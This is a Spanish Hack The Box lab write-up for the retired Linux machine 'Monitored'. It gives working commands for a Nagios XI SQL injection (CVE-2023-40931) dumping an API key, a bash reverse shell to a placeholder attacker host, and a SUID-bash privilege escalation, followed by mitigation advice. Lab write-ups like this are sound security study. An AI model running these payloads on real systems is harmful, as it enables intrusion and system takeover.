---
machine: Monitored
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, snmp, nagios, cve, sqli, privesc]
---

# Monitored — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

SNMP permite leer la línea de comandos de los procesos y filtra la contraseña de `svc`. Con ella se accede a Nagios XI, cuya versión es vulnerable a CVE-2023-40931: un SQLi en `ajax.php` vuelca el token de API de un administrador. Se crea otro administrador, se usa un comando del panel para obtener shell y, con `manage_services.sh`, se sobrescribe el binario `nagios` que root ejecuta periódicamente.

## Reconocimiento

```bash
nmap -Pn -sU -sCV -p161 <IP>
nmap -Pn -sCV -p22,80,5665 <IP>
```

- `22` SSH, `80` Apache y `5665` el servicio de Nagios.
- SNMP responde con la community `public`.
- `nagiosmonitored.htb` y `monitored.htb` aparecen en la web.

## Enumeración

- `snmpwalk -v2c -c public <IP>` muestra procesos y sus argumentos.
- La línea de `check_xi_service_nsclient` incluye `-p <PASSWORD>` para el usuario `svc`.
- Nagios XI está en `/nagiosxi/` y la versión es anterior a 5.11.2.

## Foothold

Se entra como `svc` y se abusa de CVE-2023-40931 en `ajax.php` para inyectar en `xi_users`. El volcado incluye `api_key` del administrador; con ella se llama a la API, se crea un usuario administrador y se usa el componente de comandos para ejecutar una reverse shell.

```bash
curl -s -X POST 'http://<IP>/nagiosxi/ajax.php' --data-urlencode 'cmd=gettac' --data-urlencode "user_id=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,api_key,12,13,14 FROM xi_users-- -"
```

```bash
curl -s -X POST 'http://<IP>/nagiosxi/api/v1/system/command?apikey=<API_KEY>' --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'
```

## Movimiento lateral

La shell es `nagios`. El directorio `/usr/local/nagiosxi/scripts/` contiene `manage_services.sh`, ejecutable por `nagios` y llamado por una tarea de root. El script usa rutas relativas y permisos débiles sobre `/usr/local/nagios/bin/nagios`.

```bash
ls -la /usr/local/nagiosxi/scripts/
cat /usr/local/nagiosxi/scripts/manage_services.sh
```

## Escalada de privilegios

Se reemplaza `/usr/local/nagios/bin/nagios` por un script que copia una bash SUID. El cron de root reinicia el servicio y ejecuta el binario sustituido.

```bash
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /usr/local/nagios/bin/nagios
chmod +x /usr/local/nagios/bin/nagios
/tmp/rootbash -p
```

## Evidencia

- `snmpwalk` con la contraseña de `svc` en la línea de comandos.
- Login en Nagios XI y SQLi en `ajax.php`.
- Token de API y comando ejecutado desde el panel.
- Binario `nagios` sobrescrito y bash SUID.

## Lecciones aprendidas

- SNMP puede filtrar credenciales aunque no exponga una base de datos.
- Un SQLi autenticado en un panel de administración sigue siendo crítico.
- Un script privilegiado con rutas relativas permite sustituir binarios.

## Mitigación y detección

- Restringir SNMP y no pasar contraseñas por argumentos.
- Actualizar Nagios XI y parametrizar `ajax.php`.
- Usar rutas absolutas y permisos de solo lectura en scripts de root.

## Referencias

- [0xdf — Monitored](https://0xdf.gitlab.io/2024/05/11/htb-monitored.html)
- [IppSec — Monitored](https://www.youtube.com/watch?v=Ulb2rm2qbJY)
- [Hack The Box — Monitored](https://app.hackthebox.com/machines/monitored)
